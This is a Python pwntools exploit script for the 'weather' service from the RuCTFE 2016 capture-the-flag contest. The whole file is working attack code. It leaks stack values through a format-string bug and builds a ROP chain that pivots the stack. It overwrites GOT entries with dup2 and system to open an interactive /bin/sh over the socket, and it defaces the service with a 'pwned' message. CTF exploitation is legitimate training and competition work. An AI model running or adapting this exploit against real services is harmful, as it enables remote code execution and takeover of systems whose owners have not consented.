#!/usr/bin/env python2

#  system exploit for the weather-service in RuCTFE 2016
#  written by mightymo
#  based on pwntools:
#  docu: https://docs.pwntools.com/en/stable/
#  repo: https://github.com/Gallopsled/pwntools
#  install: pip install --upgrade pwntools

from pwn import *
import re
import sys
import fcntl
import os
from hexdump import hexdump

# Set context for asm
context.clear()
context(os='linux', arch='i386', log_level='INFO', bits=32)

e = ELF('./weather')
#libc = ELF('./orig_libc.so.6')
libc = ELF('./own_libc.so.6')

# gadgets 
# https://github.com/JonathanSalwan/ROPgadget
pop_esp = 0x00003a51 # pop esp ; ret
pop_pop_ret = 0xfcf # pop edi ; pop ebp ; ret
pop_pop_pop_ret = 0x00000fce # pop esi ; pop edi ; pop ebp ; ret
orig_ret_stub = 0x000014e1 # orig return stub

# Set host and port
H,P='localhost',16761

def leak_stack_variable(num):
    p = remote(H,P) # for remote testing
    padding = "A" * 0x400
    msg = "%{}$08x".format(num)
    p.sendline(padding + msg)
    output = p.recvline()
    return int(output,16)

# leak our fd
log.info("Trying to extract fd")
fd = leak_stack_variable(46+5+1035+4)
log.info("Found fd = {0:x}".format(fd))

# leak the stack-address of the current frame's return instruction pointer
log.info("Trying to extract addr of currents frame's rip")
ebp = leak_stack_variable(46+3)
rip_addr = ebp - 4 - 0x1024 - 4
log.info("Found rip @ {0:x}".format(rip_addr))


# leak the value of the current frames' rip
log.info("Trying to extract currents frame's rip")
rip = leak_stack_variable(46+4)
log.info("Found rip = {0:x}".format(rip))
elf_base = (rip & 0xfffff000) - 0x1000
log.info("Found elf-base = {0:x}".format(elf_base))

# leak the fmtstr's buf addr
log.info("Trying to extract the fmtstr's buf addr")
fmtstr_buf = leak_stack_variable(46+7)
log.info("Found fmtstr-buf = {0:x}".format(fmtstr_buf))

# calculate plt/got addresses based on the elf base
write_plt =  elf_base + e.plt['write']
read_plt =  elf_base + e.plt['read'] 
write_got =  elf_base + e.got['write'] 
printf_got =  elf_base + e.got['printf'] 
printf_plt =  elf_base + e.plt['printf'] 
fflush_got =  elf_base + e.got['fflush'] 
memset_got =  elf_base + e.got['memset'] 
memset_plt =  elf_base + e.plt['memset'] 
fcntl_plt =  elf_base + e.plt['fcntl'] 

# calculate pop gadget addresses from elf base
pop_esp_addr = elf_base + pop_esp
pop_pop_addr = elf_base + pop_pop_ret
pop_pop_pop_addr = elf_base + pop_pop_pop_ret
orig_ret_stub_addr = elf_base + orig_ret_stub


# build rop-chain
buf = ''

# set fd blocking
buf += p32(fcntl_plt)
buf += p32(pop_pop_pop_addr)
buf += p32(fd)
buf += p32(fcntl.F_SETFL)
buf += p32(os.O_RDWR & ~os.O_NONBLOCK)

# get libc_base
buf += p32(write_plt)
buf += p32(pop_pop_pop_addr)
buf += p32(fd)
buf += p32(write_got)
buf += p32(4)

# overwrite printf@got with dup2 addr
buf += p32(read_plt)
buf += p32(pop_pop_pop_addr)
buf += p32(fd)
buf += p32(printf_got)
buf += p32(4)

# dup2(fd,stdin)
buf += p32(printf_plt)
buf += p32(pop_pop_addr)
buf += p32(fd)
buf += p32(0x0)

# dup2(fd,stout)
buf += p32(printf_plt)
buf += p32(pop_pop_addr)
buf += p32(fd)
buf += p32(0x1)

# dup2(fd,stderr)
buf += p32(printf_plt)
buf += p32(pop_pop_addr)
buf += p32(fd)
buf += p32(0x2)

# overwrite fflush@got with command
buf += p32(read_plt)
buf += p32(pop_pop_pop_addr)
buf += p32(fd)
buf += p32(fflush_got)
buf += p32(8)

# overwrite memset@got with system addr
buf += p32(read_plt)
buf += p32(pop_pop_pop_addr)
buf += p32(fd)
buf += p32(memset_got)
buf += p32(4)

# overwriting the return addr with the orig return stub
buf += p32(read_plt)
buf += p32(pop_pop_pop_addr)
buf += p32(fd)
buf += p32(rip_addr)
buf += p32(4)

# overwriting the fmtstr buffer with something non-breaking
buf += p32(read_plt)
buf += p32(pop_pop_pop_addr)
buf += p32(fd)
buf += p32(fmtstr_buf)
buf += p32(60)

# call memset@plt -> system
buf += p32(memset_plt)
buf += p32(pop_pop_addr)
buf += p32(fflush_got)
buf += p32(0x41414141)

# return to original function
buf += p32(pop_esp_addr)
buf += p32(rip_addr)
buf = buf.ljust(0x400, 'A')

# create fmtstr to overwrite the rip with pop esp;
# pivot esp from stack to rop-chain on the heap
writes = {rip_addr: pop_esp_addr}
buf += fmtstr_payload(57+1, writes)

# create new connection
p = remote(H,P) 
log.info("Sending rop-chain && overwriting rip with pop esp; ret")
p.sendline(buf)

# read write@got
output = p.recv(8)
write_addr = unpack(output)

log.info("Found write @ {0:x}".format(write_addr))

# calc libc-offsets
libc.address = write_addr - libc.symbols['write']
log.info("Libc base @ {0:x}".format(libc.address))

log.info("dup2 @ {0:x}".format(libc.symbols['dup2']))

log.info("system @ {0:x}".format(libc.symbols['system']))

# send dup2 addr
log.info("Overwriting printf@got with dup2")
p.send(p32(libc.symbols['dup2']))

# send command
log.info("Overwriting fflush@got with command")
#p.send('cat weather.db')
p.send('/bin/sh\x00')

# send system addr
log.info("Overwriting memset@got with system")
p.send(p32(libc.symbols['system']))

# send return stub address
log.info("Repairing the return addr")
p.send(p32(orig_ret_stub_addr))

# send fmtstr cleanup
log.info("Repairing the fmtstr")
p.sendline("This service has been pwned! No weather available!\x00")

# receive commands output
log.success("Calling system(command)")

#print p.recv(4096)
p.interactive() 

